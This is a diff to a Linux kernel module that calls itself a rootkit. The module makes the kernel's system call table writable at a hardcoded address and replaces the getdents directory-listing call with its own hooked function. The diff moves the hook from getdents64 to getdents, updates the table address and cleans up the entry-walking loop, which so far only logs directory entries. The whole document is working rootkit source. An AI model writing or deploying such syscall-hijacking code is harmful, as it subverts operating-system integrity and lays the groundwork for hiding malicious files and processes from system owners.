@@ -10,22 +10,15 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/string.h>
-
+#include <linux/syscalls.h>
 
 struct linux_dirent {
-    unsigned long  d_ino;     /* Inode number */
-    off_t  d_off;     /* Offset to next linux_dirent */
-    unsigned short d_reclen;  /* Length of this linux_dirent */
-    char           d_name[];  /* Filename (null-terminated) */
-                        /* length is actually (d_reclen - 2 -
-                           offsetof(struct linux_dirent, d_name) */
-    /*
-    char           pad;       // Zero padding byte
-    char           d_type;    // File type (only since Linux 2.6.4;
-                              // offset is (d_reclen - 1))
-    */
-
+	long           d_ino;
+	off_t          d_off;
+	unsigned short d_reclen;
+	char           d_name[];
 };
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("1337");
@@ -48,17 +41,16 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 
 	int num_reads = real_getdents(fd, dirp, count);
 
-	struct linux_dirent *current_dirent;	
-	int i = 0;
+	struct linux_dirent *cdirp;
+	int i, j;
+	long start_offset = dirp;
+	cdirp = dirp;
 	printk(KERN_INFO "num reads: %d\n",num_reads);
 
-	for (i = 0; i < num_reads; i+= dirp->d_reclen){
-		current_dirent = (struct linux_dirent*)(dirp + i);
-		int j = 0;
-		for (j = 0; j < 15; j++){
-			printk(KERN_INFO "%c\n",*((char *)(dirp+j)) );
-		}
-		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",dirp->d_ino,dirp->d_reclen,dirp->d_off,dirp->d_name);
+	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
+		cdirp = (struct linux_dirent*)(start_offset + i);
+		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
+		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
 	}
 	return num_reads;
 }
@@ -85,8 +77,8 @@ int make_ro(unsigned long address){
 
 void hijack_sys_call_table(void){
 	make_rw((unsigned long)sys_call_table);
-        real_getdents = (void*)*(sys_call_table + __NR_getdents64);
-        *(sys_call_table + __NR_getdents64) = (unsigned long)hijacked_getdents;
+        real_getdents = (void*)*(sys_call_table + __NR_getdents);
+        *(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
 	//make_ro((unsigned long)sys_call_table);
 }
 
@@ -97,7 +89,7 @@ int init_module(void){
 	taken from the /boot/System map file. This address seems to be the same
 	after every boot, so for now it can be hardcoded.
 	*/
-	sys_call_table = (unsigned long*)0xc1688140;	
+	sys_call_table = (unsigned long*)0xc1697140;	
 	hijack_sys_call_table();	
 	
 	printk(KERN_INFO "Rootkit added.\n\n");
@@ -107,7 +99,7 @@ int init_module(void){
 
 void cleanup_module(void){
       	//make_rw((unsigned long)sys_call_table);
-	*(sys_call_table + __NR_getdents64) = (unsigned long)real_getdents;
+	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
 	make_ro((unsigned long)sys_call_table);
 	printk(KERN_INFO "Rootkit removed.\n");
 }
